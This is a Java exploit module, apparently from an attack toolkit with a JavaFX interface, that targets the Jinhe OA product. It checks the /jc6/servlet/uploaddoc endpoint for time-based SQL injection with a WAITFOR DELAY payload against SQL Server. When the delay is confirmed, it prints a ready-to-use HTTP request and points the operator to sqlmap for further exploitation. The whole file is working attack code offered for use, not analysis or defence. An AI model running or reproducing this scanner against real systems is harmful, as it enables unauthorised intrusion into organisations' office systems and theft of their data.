package exp.oa.jinheoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.HttpTools_getTime;
import utils.Response;

import java.util.HashMap;

public class jinhe_uploaddoc_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，请利用sqlmap进行测试");
        });
        return null;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            String data = "key=readimage&sKeyvalue=1';WAITFOR DELAY '0:0:3'--";
            long var = HttpTools_getTime.post(url + "/jc6/servlet/uploaddoc" ,data, head, "utf-8");
            if ( var > 3000) {
                String target_req = "POST /jc6/servlet/uploaddoc HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\n" +
                        "Content-Length: 50\n" +
                        "Cache-Control: max-age=0\n" +
                        "Connection: close\n" +
                        "Content-Type: application/x-www-form-urlencoded\n" +
                        "Sec-Ch-Ua: \"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"\n" +
                        "Upgrade-Insecure-Requests: 1\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "\n" +
                        "key=readimage&sKeyvalue=1';WAITFOR DELAY '0:0:3'--";
                Platform.runLater(() -> {
                    textArea.appendText("\n [ jinhe_uploaddoc_sqli ]");
                    textArea.appendText("\n 利用sqlmap模块进行注入,注入类型:延时注入,sql:sqlserver");
                    textArea.appendText("\n");
                });
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
